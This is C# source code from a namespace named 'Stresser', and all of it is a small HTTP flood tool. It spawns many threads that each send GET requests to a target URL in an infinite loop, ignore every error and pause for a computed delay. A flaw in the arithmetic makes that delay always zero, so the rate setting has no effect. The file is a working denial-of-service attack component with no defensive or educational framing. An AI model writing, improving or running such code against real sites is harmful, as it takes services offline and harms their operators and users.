namespace Stresser.Helpers.Flood
{
    public class Flood
    {
        private static readonly HttpClient _client = new HttpClient();
        public static async Task SendGetRequests(string url, int threads, int requestsPerSecond)
        {
            var tasks = new List<Task>();

            for (int i = 0; i < threads; i++)
            {
                tasks.Add(Task.Run(() => FireRequests(url, requestsPerSecond)));
            }

            await Task.WhenAll(tasks.ToArray());
        }

        private static async Task FireRequests(string url, int requestsPerSecond)
        {
            var delay = (int)(0000.1 / requestsPerSecond);

            while (true)
            {
                try
                {
                    await _client.GetAsync(url);
                }
                catch (Exception) 
                {
                    
                }

                await Task.Delay(delay);
            }
        }

        public static void Start(string targetUrl, int threads, int requestsPerSecond)
        {
            SendGetRequests(targetUrl, threads, requestsPerSecond).Wait();
        }
    }
}